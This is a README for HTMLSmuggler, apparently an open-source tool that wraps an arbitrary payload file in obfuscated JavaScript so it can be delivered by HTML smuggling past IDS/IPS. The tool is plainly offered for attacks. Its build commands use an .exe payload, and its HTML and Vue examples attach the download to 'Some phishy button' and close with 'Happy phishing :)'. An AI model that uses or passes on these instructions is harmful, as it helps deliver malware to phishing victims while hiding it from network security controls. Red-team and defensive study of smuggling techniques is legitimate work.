# HTMLSmuggler ✉️

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

HTMLSmuggler - JS payload generator for IDS bypass and payload delivery via HTML smuggling.

## Description

The full explanation what is HTML Smuggling may be found [here](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/).

The primary objective of HTML smuggling is to bypass network security controls, such as firewalls and intrusion detection systems, by disguising malicious payloads within seemingly harmless HTML and JavaScript code. By exploiting the dynamic nature of web applications, attackers can deliver malicious content to a user's browser without triggering security alerts or being detected by traditional security mechanisms. Thanks to this technique, the download of a malicious file is not displayed in any way in modern IDS solutions.

The main goal of HTMLSmuggler tool is creating an independent javascript library with embedded malicious user-defined payload. This library may be integrated into your phishing sites/email html attachments/etc. to bypass IDS and IPS system and deliver embedded payload to the target user system. An example of created javascript library may be found [here](examples/html/payload.umd.js).

## Features

* Built-in highly configurable JavaScript obfuscator that fully hides your payload.
* May be used both as an independent JS library or embedded in JS frameworks such as React, Vue.js, etc.
* The simplicity of the template allows you to add extra data handlers/compressions/obfuscations.

## Installation

1. [Install yarn](https://classic.yarnpkg.com/lang/en/docs/install/) package manager.
2. Install dependencies:

    ```bash
    yarn
    ```

3. Read help message.

    ```bash
    yarn build -h
    ```

    ```text
    Options:
      -p, --payload <string>   Path to payload file you want to smuggle
      -n, --name <string>      Name of file, that would be downloaded
      -t, --type <string>      Contet-Type of downlonaded file (default: "application/octet-stream")
      -f, --function <string>  Name of exported function (default: "download")
      -c, --compress           Enable payload compression (gzip)
      -h, --help               display help for command
    ```

## Usage

### Preparation steps

1. Modify (or use my) [javascript-obfuscator options](https://github.com/javascript-obfuscator/javascript-obfuscator#javascript-obfuscator-options) in `obfuscator.js`, my preset is nice, but very slow.
2. Compile your javascript payload:

    ```bash
    yarn build -p /path/to/payload -n file.exe -t "application/octet-stream" -c
    ```

3. Get your payload from `dist/payload.esm.js` or `dist/payload.umd.js`. After that, it may be inserted into your page and called with `download()` (or custom specified with `-f` flag) function.

> `payload.esm.js` is used in `import { download } from 'payload.esm';` imports (ECMAScript standart).
>
> `payload.umd.js` is used in html script SRC and `require('payload.umd');` imports (CommonJS, AMD and pure html).

### Pure HTML example

A full example may be found [here](examples/html/).

1. Do [preparation steps](#preparation-steps).
2. Import created script to html file (or insert it inline):

    ```html
    <head>
      <script src="payload.umd.js"></script>
    </head>
    ```

3. Call `download()` function from body:

    ```html
    <body>
      <button onclick="download()">Some phishy button</button>
    </body>
    ```

4. Happy phishing :)

### VueJS example

A full example may be found [here](examples/vuejs/).

1. Do [preparation steps](#preparation-steps).
2. Import created script to vue file:

    ```vue
    <script>
      import { download } from './payload.esm';
    </script>
    ```

3. Call `download()` function:

    ```vue
    <template>
      <button @click="download()">Some phishy button</button>
    </template>
    ```

4. Happy phishing :)

## FAQ

**Q**: I have an error `RangeError: Maximum call stack size exceeded`, how to solve it?

**A**: This [issue described here](https://github.com/javascript-obfuscator/javascript-obfuscator/issues/89). To fix it, try to disable `splitStrings` in `obfuscator.js` or make smaller payload (it's recommended to use up to 2 MB payloads because of this issue).

---

**Q**: Why does my payload build so long?

**A**: The bigger payload you use, the longer it takes to create a JS file. To decrease time of build, try to disable `splitStrings` in `obfuscator.js`. Below is a table with estimated build times using default `obfuscator.js`.

| Payload size | Build time |
| --- | --- |
| 525 KB | 53 s |
| 1.25 MB | 8 m |
| 3.59 MB | 25 m |
